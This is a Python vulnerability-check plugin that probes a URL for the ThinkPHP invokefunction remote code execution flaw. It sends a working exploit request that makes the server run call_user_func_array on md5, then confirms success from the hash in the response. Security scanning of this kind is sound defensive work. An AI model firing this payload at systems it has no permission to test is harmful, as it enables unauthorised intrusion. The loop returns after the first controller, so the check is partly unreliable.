import re
import urllib
import requests


def thinkphp_invoke_func_code_exec(url):
    relsult = {
        'name': 'thinkphp_invoke_func_code_exec',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    controllers = list()
    try:
        req = requests.get(url, headers=headers, timeout=15, verify=False)
    except:
        return relsult
    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.text)
    for match in matches:
        controllers.append(match.split('/')[1])
    controllers.append('index')
    controllers = list(set(controllers))
    for controller in controllers:
        try:
            payload = 'index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(controller)
            vurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req.text:
                relsult['vulnerable'] = True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vurl
            return relsult

        except:
            return relsult
